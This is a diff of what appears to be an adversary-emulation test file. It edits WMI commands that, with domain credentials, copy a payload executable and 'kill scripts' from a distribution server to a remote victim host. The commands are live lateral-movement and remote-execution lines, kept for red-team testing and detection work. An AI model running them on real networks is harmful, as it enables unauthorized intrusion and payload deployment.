@@ -891,11 +891,15 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
 
   input_arguments:
     internal_IP:
-      description: Hostname or IP address
+      description: Hostname or IP address of remote (victim internal network) system
+      type: string
+      default: 127.0.0.1
+    distribution_server:
+      description: Hostname of IP address of distribution server
       type: string
       default: 127.0.0.1
     domain_user:
@@ -909,7 +913,7 @@
     - name: command_prompt
       elevation_required: true
       command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
 
 - id: 5dcbd042-e8e5-4f3f-8055-7284e4d5112c
   name: Distribute Kill Scripts via WMI
@@ -925,11 +929,15 @@
     windows:
       cmd:
         command: |
-          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+          start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\"
 
   input_arguments:
     internal_IP:
-      description: Hostname or IP address
+      description: Hostname or IP address of remote (victim internal network) system
+      type: string
+      default: 127.0.0.1
+    distribution_server:
+      description: Hostname of IP address of distribution server
       type: string
       default: 127.0.0.1
     domain_user:
@@ -946,7 +954,7 @@
     - name: command_prompt
       elevation_required: true
       command: |
-        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+        start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\"
 
 - id: eb4c2ff6-3534-404c-bf1c-d864a508c162
   name: Execute Kill Scripts via WMI
